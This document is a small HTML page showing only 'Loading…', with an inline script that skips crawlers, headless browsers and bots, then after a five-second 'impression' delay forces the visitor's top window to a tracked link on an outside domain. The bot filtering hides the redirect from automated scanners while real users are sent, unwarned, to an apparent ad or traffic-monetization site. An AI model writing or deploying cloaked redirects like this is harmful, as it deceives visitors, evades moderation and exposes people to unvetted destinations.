<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Redirect</title>
</head>
<body>

<script>
(function () {

    // === BASIC ENV CHECK ===
    if (!navigator.userAgent) return;

    const ua = navigator.userAgent.toLowerCase();

    // === BLOCK OBVIOUS BOTS ONLY ===
    if (
        ua.includes("headless") ||
        ua.includes("phantom") ||
        ua.includes("crawler") ||
        ua.includes("spider") ||
        ua.includes("bot")
    ) return;

    // === PREVENT MULTIPLE REDIRECT ===
    if (sessionStorage.getItem("rd_done")) return;
    sessionStorage.setItem("rd_done", "1");

    // === SAFE DELAY FOR IMPRESSION ===
    setTimeout(function () {
        try {
            window.top.location.replace("https://monthsexpressive.com/evjxbnbq?key=584a8b65de5c6f3d3f11aa6f2e3a0f01");
        } catch (e) {
            window.location.href = "https://monthsexpressive.com/evjxbnbq?key=584a8b65de5c6f3d3f11aa6f2e3a0f01";
        }
    }, 5000);

})();
</script>

<p>Loading…</p>

</body>
</html>
